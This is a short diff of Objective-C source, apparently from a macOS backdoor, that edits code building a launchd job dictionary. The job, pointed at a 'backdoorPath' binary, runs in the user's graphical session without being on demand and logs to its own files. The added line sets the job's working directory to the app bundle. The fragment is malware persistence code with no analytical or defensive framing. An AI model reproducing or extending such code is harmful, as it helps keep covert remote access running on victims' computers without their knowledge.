@@ -338,6 +338,7 @@ static __m_MUtils *sharedUtils = nil;
     [[NSDictionary alloc] initWithObjectsAndKeys:aLabel, @"Label",
                                                  @"Aqua", @"LimitLoadToSessionType",
                                                  [NSNumber numberWithBool: FALSE], @"OnDemand",
+                                                [[NSBundle mainBundle] bundlePath], @"WorkingDirectory",
                                                  [NSArray arrayWithObjects: backdoorPath, nil], @"ProgramArguments",
                                                  errorLog, @"StandardErrorPath",
                                                  outLog, @"StandardOutPath",
